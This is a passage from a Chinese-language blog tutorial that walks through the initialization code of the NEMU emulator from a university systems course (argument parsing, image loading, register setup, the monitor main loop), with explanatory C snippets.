class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mainargs = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *log_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *diff_so_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *img_file = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> is_batch_mode = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">parse_args</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> o;</span><br><span class="line">  <span class="keyword">while</span> ( (o = getopt(argc, argv, <span class="string">&quot;-bl:d:a:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (o) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: is_batch_mode = <span class="literal">true</span>; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>: mainargs = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>: log_file = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: diff_so_file = optarg; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (img_file != <span class="literal">NULL</span>) Log(<span class="string">&quot;too much argument &#x27;%s&#x27;, ignored&quot;</span>, optarg);</span><br><span class="line">                <span class="keyword">else</span> img_file = optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">                panic(<span class="string">&quot;Usage: %s [-b] [-l log_file] [img_file]&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>int getopt(int argc, char * const argv[ ], const char * optstring);</code></p><blockquote><p><strong>getopt作用：</strong>getopt用于分析参数。前两个参数就是main的参数。后面是个选项字符串：上文中的<code>-bl:d:a:</code>就是命令行中对应的<code>-b -l -d -a</code>，冒号表示这个选项后面必须带有参数，可以和选项连在一起写，也可以用空格隔开。两个冒号表示参数可选，就是可以带有参数也可以不带。</p><p>optarg指向额外参数</p><p><strong>return value：</strong>如果选项成功找到，返回选项字母。当所有命令行被解析，则getopt返回<code>-1</code>。如果存在未知的选项或缺失选项，getopt会返回<code>?</code>。</p></blockquote><h3 id="init-log"><a href="#init-log" class="headerlink" title="init_log"></a>init_log</h3><p>然后是打开log</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FILE *log_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *log_file)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (log_file == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">  log_fp = fopen(log_file, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  Assert(log_fp, <span class="string">&quot;Can not open &#x27;%s&#x27;&quot;</span>, log_file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打开log，失败报错。</span></span><br></pre></td></tr></table></figure><h3 id="load-img"><a href="#load-img" class="headerlink" title="load_img"></a>load_img</h3><p>将镜像文件读取到计算机内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 我们让monitor直接把一个有意义的客户程序读入到一个固定的内存位置IMAGE_START</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_START 0x100000</span></span><br><span class="line"><span class="comment">// convert the guest physical address in the guest program to host virtual address in NEMU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mainargs = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *img_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">load_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> size;</span><br><span class="line">  <span class="keyword">if</span> (img_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    Log(<span class="string">&quot;No image is given. Use the default build-in image.&quot;</span>);</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uint8_t</span> isa_default_img[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">long</span> isa_default_img_size;</span><br><span class="line">    size = isa_default_img_size;</span><br><span class="line">    <span class="built_in">memcpy</span>(guest_to_host(IMAGE_START), isa_default_img, size); <span class="comment">// 读取内置镜像到内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(img_file, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    Assert(fp, <span class="string">&quot;Can not open &#x27;%s&#x27;&quot;</span>, img_file); <span class="comment">// 失败的话报错</span></span><br><span class="line"></span><br><span class="line">    Log(<span class="string">&quot;The image is %s&quot;</span>, img_file);</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    size = ftell(fp);</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    ret = fread(guest_to_host(IMAGE_START), size, <span class="number">1</span>, fp); <span class="comment">// 读取镜像到内存</span></span><br><span class="line">    assert(ret == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mainargs</span></span><br><span class="line">    <span class="built_in">strcpy</span>(guest_to_host(<span class="number">0</span>), mainargs);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有镜像文件，就会根据你选择的ISA读取内置程序。本文选择的ISA是x86，下面阅读的代码也将是x86。</p><p><img src="https://i.loli.net/2021/06/22/C2sVqwNKQb78yLU.png" alt="image-20210622183442094"></p><p><strong>简单科普一下vscode快捷键，方便大家审阅代码。</strong></p><blockquote><p><code>f12</code> 转到定义<br><code>alt+方向键的←</code> 返回<br><code>alt+方向键的→</code> 前进</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> isa_default_img []  = &#123;</span><br><span class="line">  <span class="number">0xb8</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100000:  movl  $0x1234,%eax</span></span><br><span class="line">  <span class="number">0xb9</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,        <span class="comment">// 100005:  movl  $0x100027,%ecx</span></span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x01</span>,                          <span class="comment">// 10000a:  movl  %eax,(%ecx)</span></span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xc7</span>, <span class="number">0x41</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,  <span class="comment">// 10000c:  movw  $0x1,0x4(%ecx)</span></span><br><span class="line">  <span class="number">0xbb</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100012:  movl  $0x2,%ebx</span></span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xc7</span>, <span class="number">0x84</span>, <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0xe0</span>,  <span class="comment">// 100017:  movw  $0x1,-0x2000(%ecx,%ebx,4)</span></span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="comment">// 100021:  movl  $0x0,%eax</span></span><br><span class="line">  <span class="number">0xd6</span>,                                <span class="comment">// 100026:  nemu_trap</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">long</span> isa_default_img_size = <span class="keyword">sizeof</span>(isa_default_img);</span><br></pre></td></tr></table></figure><p><strong>BIOS和计算机启动</strong></p><blockquote><p>内存是一种RAM，这意味着计算机在刚启动的时候，内存中的数据都是没有意义的。BIOS是一种ROM，它的内容不会因为断电而丢失。<br>所以在计算机启动的时候，首先会把控制权交给BIOS，BIOS在经过初始化工作后，再从磁盘将有意义的程序读入计算机内存中执行。</p><p>PA中对这些细节做了简化，采用约定的方式让CPU直接从约定的内存位置开始执行。</p></blockquote><h3 id="init-isa"><a href="#init-isa" class="headerlink" title="init_isa"></a>init_isa</h3><p>同样的，下一个函数初始化ISA，我们选择阅读x86代码(以下将不再提示，将会直接选择x86代码)</p><p><img src="https://i.loli.net/2021/06/22/zaTx59nQPSKGvoC.png" alt="image-20210622221849528"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_isa</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Test the implementation of the &#x27;CPU_state&#x27; structure. */</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">reg_test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">  reg_test();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Setup physical memory address space. */</span></span><br><span class="line">  register_pmem(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize this virtual computer system. */</span></span><br><span class="line">  restart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一个作业就是让我们实现寄存器结构体，reg_test函数会生成随机数据，对我们写的代码进行测试。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    word PC; <span class="comment">// Program Counter,</span></span><br><span class="line">    byte SP; <span class="comment">// Stack Pointer,</span></span><br><span class="line">    byte A, X, Y; <span class="comment">// Registers</span></span><br><span class="line">    byte P; <span class="comment">// Flag Register</span></span><br><span class="line">&#125; CPU_STATE;</span><br><span class="line">CPU_state cpu;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> R_EAX, R_ECX, R_EDX, R_EBX, R_ESP, R_EBP, R_ESI, R_EDI &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> reg_l(index) (cpu.gpr[check_reg_index(index)]._32)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reg_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  srand(time(<span class="number">0</span>)); <span class="comment">// 见下方解析</span></span><br><span class="line">  <span class="keyword">uint32_t</span> sample[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">uint32_t</span> pc_sample = rand();</span><br><span class="line">  cpu.pc = pc_sample;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = R_EAX; i &lt;= R_EDI; i ++) &#123;</span><br><span class="line">    sample[i] = rand();</span><br><span class="line">    reg_l(i) = sample[i];</span><br><span class="line">    assert(reg_w(i) == (sample[i] &amp; <span class="number">0xffff</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  assert(reg_b(R_AL) == (sample[R_EAX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_AH) == ((sample[R_EAX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_BL) == (sample[R_EBX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_BH) == ((sample[R_EBX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_CL) == (sample[R_ECX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_CH) == ((sample[R_ECX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_DL) == (sample[R_EDX] &amp; <span class="number">0xff</span>));</span><br><span class="line">  assert(reg_b(R_DH) == ((sample[R_EDX] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>));</span><br><span class="line"></span><br><span class="line">  assert(sample[R_EAX] == cpu.eax);</span><br><span class="line">  assert(sample[R_ECX] == cpu.ecx);</span><br><span class="line">  assert(sample[R_EDX] == cpu.edx);</span><br><span class="line">  assert(sample[R_EBX] == cpu.ebx);</span><br><span class="line">  assert(sample[R_ESP] == cpu.esp);</span><br><span class="line">  assert(sample[R_EBP] == cpu.ebp);</span><br><span class="line">  assert(sample[R_ESI] == cpu.esi);</span><br><span class="line">  assert(sample[R_EDI] == cpu.edi);</span><br><span class="line"></span><br><span class="line">  assert(pc_sample == cpu.pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果对随机不太了解，可以试一试下面的程序。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;time: %d\n&quot;</span>,time(<span class="number">0</span>)); <span class="comment">// time(0)返回当前时间戳，如果失败返回0。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand1: %d\n&quot;</span>,rand());</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand2: %d\n&quot;</span>,rand());</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand3: %d\n&quot;</span>,rand());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// srand是随机数的初始化函数，通过参数生成伪随机数赋值给rand。</span></span><br></pre></td></tr></table></figure><blockquote><p>如果对enum不太了解，可以试试下面的程序</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> R_EAX, R_ECX, R_EDX, R_EBX, R_ESP, R_EBP, R_ESI, R_EDI &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_EAX);<span class="comment">// 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_ECX);<span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,R_EDX); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后是register_pmem函数，我们用它记录了物理内存的地址(NEMU默认为128MB的物理内存)。对于一些ISA来说，物理内存并不是从0开始的，例如mips32和riscv32的物理地址均从<code>0x80000000</code>开始。因此我们需要记录其物理内存的起始地址。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> IOMap pmem_map = &#123;</span><br><span class="line">  .name = <span class="string">&quot;pmem&quot;</span>,</span><br><span class="line">  .space = pmem,</span><br><span class="line">  .callback = <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="comment">// we treat ioaddr_t as paddr_t here</span></span><br><span class="line">  <span class="keyword">paddr_t</span> low;</span><br><span class="line">  <span class="keyword">paddr_t</span> high;</span><br><span class="line">  <span class="keyword">uint8_t</span> *space;</span><br><span class="line">  <span class="keyword">io_callback_t</span> callback;</span><br><span class="line">&#125; IOMap;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PMEM_SIZE (128 * 1024 * 1024)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">register_pmem</span><span class="params">(<span class="keyword">paddr_t</span> base)</span> </span>&#123;</span><br><span class="line">  pmem_map.low = base;</span><br><span class="line">  pmem_map.high = base + PMEM_SIZE - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  Log(<span class="string">&quot;Add &#x27;%s&#x27; at [0x%08x, 0x%08x]&quot;</span>, pmem_map.name, pmem_map.low, pmem_map.high);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后是restart函数，它用于初始化寄存器。设置pc指针到我们约定好的地方。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PC_START (0x80000000u + IMAGE_START)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_START 0x100000</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">restart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Set the initial program counter. */</span></span><br><span class="line">  cpu.pc = PC_START;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="初始化后的内存布局"><a href="#初始化后的内存布局" class="headerlink" title="初始化后的内存布局"></a>初始化后的内存布局</h3><p>读入客户程序并对寄存器进行初始化后的内存的布局如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pmem:</span><br><span class="line"></span><br><span class="line">0             0x100000</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|                 |                  |</span><br><span class="line">|                 |    guest prog    |</span><br><span class="line">|                 |                  |</span><br><span class="line">-----------------------------------------------</span><br><span class="line">                  ^</span><br><span class="line">                  |</span><br><span class="line">                 pc</span><br></pre></td></tr></table></figure><h3 id="作业1"><a href="#作业1" class="headerlink" title="作业1"></a>作业1</h3><p>要求：我们需要完善CPU_state结构体，访问<code>cpu.gpr[3]._16</code>，我们将得到<code>bx</code>寄存器；访问<code>cpu.gpr[1]._8[1]</code>，我们将得到<code>ch</code>寄存器。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="keyword">uint32_t</span> _32;</span><br><span class="line">      <span class="keyword">uint16_t</span> _16;</span><br><span class="line">      <span class="keyword">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">    &#125;gpr[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">      <span class="keyword">rtlreg_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">vaddr_t</span> pc;</span><br><span class="line">&#125; CPU_state;</span><br></pre></td></tr></table></figure><p>简单解释一下上文的代码（有关union请查看这篇<a href="https://kazamayc.github.io/2020/09/18/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-c%E5%9F%BA%E7%A1%80/">文章</a>或者百度）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">uint32_t _32;</span><br><span class="line">uint16_t _16;</span><br><span class="line">uint8_t _8[2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码在内存中分配了<code>uint32_t</code>的空间，也就是32位。加上<code>gpr[8]</code>后，分配<code>32*8</code>的空间。然后我们存放寄存器的结构体，也分配了<code>32*8</code>的空间，这样我们的union就对应上了。</p><h3 id="ui-mainloop"><a href="#ui-mainloop" class="headerlink" title="ui_mainloop"></a>ui_mainloop</h3><p><img src="https://i.loli.net/2021/06/27/eohuZjNwbVEIHKz.png" alt="image-20210627155435195"></p><p>当出现这个界面的时候，说明monitor的初始化工作已经完成，我们进入了ui_mainloop函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cmd_c</span><span class="params">(<span class="keyword">char</span> *args)</span> </span>&#123;</span><br><span class="line">  cpu_exec(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpu_exec</span><span class="params">(<span class="keyword">uint64_t</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (; n &gt; <span class="number">0</span>; n --) &#123;</span><br><span class="line">    __attribute__((unused)) <span class="keyword">vaddr_t</span> ori_pc = cpu.pc;</span><br><span class="line">    __attribute__((unused)) <span class="keyword">vaddr_t</span> seq_pc = exec_once();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// -1的n是无符号64位数</span></span><br></pre></td></tr></table></figure><p>然后我们输入c，程序就会执行我们之前load_img默认的客户程序。详细请查看PA文档。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>三个对调试有用的宏(在<code>nemu/include/debug.h</code>中定义)：</p><ul><li><code>Log()</code>是<code>printf()</code>的升级版，专门用来输出调试信息，同时还会输出使用<code>Log()</code>所在的源文件，行号和函数，当输出的调试信息过多的时候，可以很方便地定位到代码中的相关位置；</li><li><code>Assert()</code>是<code>assert()</code>的升级版，当测试条件为假时，在assertion fail之前可以输出一些信息；</li><li><code>panic()</code>用于输出信息并结束程序，相当于无条件的assertion fail。</li></ul><p>代码框架：</p><ol><li>vaddr，paddr分别代表虚拟地址和物理地址；</li><li>存储器是个在<code>nemu/src/memory/memory.c</code>中定义的大数组；</li><li>PC和通用寄存器都在<code>nemu/src/isa/$ISA/include/isa/reg.h</code>中的结构体中定义；</li><li>加法器在PA2介绍；</li><li>TRM（图灵机）的工作方式通过<code>cpu_exec()</code>和<code>exec_once()</code>体现。</li></ol><h3 id="正经的ui-mainloop解析"><a href="#正经的ui-mainloop解析" class="headerlink" title="正经的ui_mainloop解析"></a>正经的ui_mainloop解析</h3><p>上面那个是不正经的(逃)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ui_mainloop</span><span class="params">(<span class="keyword">int</span> is_batch_mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (is_batch_mode) &#123;</span><br><span class="line">    cmd_c(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">char</span> *str; (str = rl_gets()) != <span class="literal">NULL</span>; ) &#123;</span><br><span class="line">    <span class="keyword">char</span> *str_end = str + <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">char</span> 